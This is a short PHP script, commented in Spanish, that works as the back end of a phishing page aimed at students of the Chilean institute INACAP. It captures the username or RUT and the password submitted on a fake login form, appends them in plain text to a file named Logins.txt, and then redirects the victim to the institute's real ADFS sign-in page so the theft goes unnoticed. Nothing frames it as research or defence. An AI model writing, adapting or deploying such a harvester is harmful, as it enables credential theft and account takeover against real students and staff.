<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo_rut = $_POST['UserName'];
    $contrasena = $_POST['Password'];

    // Sanitizar para evitar problemas
    $correo_rut = trim($correo_rut);
    $contrasena = trim($contrasena);

    // Formato de la línea a guardar
    $linea = "Correo/rut: $correo_rut | Contraseña: $contrasena" . PHP_EOL;

    // Guardar en archivo sin borrar contenido
    file_put_contents("Logins.txt", $linea, FILE_APPEND);

    header("Location: https://adfs.inacap.cl/adfs/ls/?wtrealm=https://siga.inacap.cl/sts/&wa=wsignin1.0&wreply=https://siga.inacap.cl/sts/&wctx=https%3A%2F%2Fadfs.inacap.cl%2Fadfs%2Fls%2F%3Fwreply%3Dhttps%3A%2F%2Fintranet.inacap.cl%2Ftportalvp%2Falumnos-intranet%26wtrealm%3Dhttps%3A%2F%2Fintranet.inacap.cl%2F");
    
}
?>